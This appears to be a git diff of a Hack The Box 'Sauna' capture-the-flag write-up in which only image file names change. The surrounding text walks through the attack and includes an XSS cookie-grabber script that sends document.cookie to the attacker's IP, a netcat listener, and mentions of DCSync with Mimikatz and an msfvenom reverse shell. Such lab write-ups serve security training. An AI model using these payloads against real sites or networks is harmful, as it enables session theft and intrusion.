@@ -109,11 +109,11 @@ The main page reveals it's a bank.
 
 I turn on BurpSuite in the background as I click around the different pages. There's an about page with full names of the team members. This might come in handy later.
 
-![images/Untitled%201.png](images/Untitled%201.png)
+![images/Untitled1.png](images/Untitled1.png)
 
 There's a contact page with a form.
 
-![images/Untitled%202.png](images/Untitled%202.png)
+![images/Untitled2.png](images/Untitled2.png)
 
 I try a quick XSS on each field, with a script source requesting back to a netcat listener on my machine.
 
@@ -121,23 +121,23 @@ I try a quick XSS on each field, with a script source requesting back to a netca
 root@kali:/home/kali/htb/sauna/# nc -nvlp 80
 ```
 
-![images/Untitled%203.png](images/Untitled%203.png)
+![images/Untitled3.png](images/Untitled3.png)
 
 The email field tries to validate and fails. I remove it and re-run, and get the following error message.
 
-![images/Untitled%204.png](images/Untitled%204.png)
+![images/Untitled4.png](images/Untitled4.png)
 
 I remove all the XSS and try regular strings, and get the same response. I check Burp, and no request is shown. I open Firefox dev tools, and see a POST is being used.
 
-![images/Untitled%205.png](images/Untitled%205.png)
+![images/Untitled5.png](images/Untitled5.png)
 
 I click 'edit and resend', modify the request method to be GET, and get a 200.
 
-![images/Untitled%206.png](images/Untitled%206.png)
+![images/Untitled6.png](images/Untitled6.png)
 
 Burp captures this request now, so I send it to repeater, highlight the script tags and use Ctrl-U to encode the requests.
 
-![images/Untitled%207.png](images/Untitled%207.png)
+![images/Untitled7.png](images/Untitled7.png)
 
 I wait a little while and don't receive a connection back. I try one more trick with a cookie grabber, and repeat the encoding process with Ctrl-U.
 
@@ -145,7 +145,7 @@ I wait a little while and don't receive a connection back. I try one more trick 
 <script>new Image().src="http://10.10.14.8/fake.jpg?output="+document.cookie;</script>
 ```
 
-![images/Untitled%208.png](images/Untitled%208.png)
+![images/Untitled8.png](images/Untitled8.png)
 
 Nothing that time either, so time to move on. I do a quick enumeration with [dirsearch.py](http://dirsearch.py) to look for any hidden folders. I don't get anything I didn't see with Burp.
 
@@ -384,7 +384,7 @@ egotisticalbank\fsmith
 
 And I get the user flag.
 
-![images/Untitled%209.png](images/Untitled%209.png)
+![images/Untitled9.png](images/Untitled9.png)
 
 ```bash
 user.txt
@@ -487,11 +487,11 @@ Then I download the zip with evil-winrm, unpack the files and dump them to Blood
 
 [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)
 
-![images/Untitled%2010.png](images/Untitled%2010.png)
+![images/Untitled10.png](images/Untitled10.png)
 
 Selecting the Query 'Find Prinicipals with DCSync Rights,' I find svc_loanmgr has the two privileges necessary to perform a DCSync attack.
 
-![images/Untitled%2011.png](images/Untitled%2011.png)
+![images/Untitled11.png](images/Untitled11.png)
 
 Mimikatz is the perfect tool for this, but evil-winrm doesn't handle it too well, so I generate a reverse shell with msfvenom.
 
@@ -633,7 +633,7 @@ Smbexec is a little limiting as far as shell commands you can use, so I kill my 
 C:\Windows\system32>C:\Users\svc_loanmgr\Documents\shell.exe
 ```
 
-![images/Untitled%2012.png](images/Untitled%2012.png)
+![images/Untitled12.png](images/Untitled12.png)
 
 ```bash
 root.txt
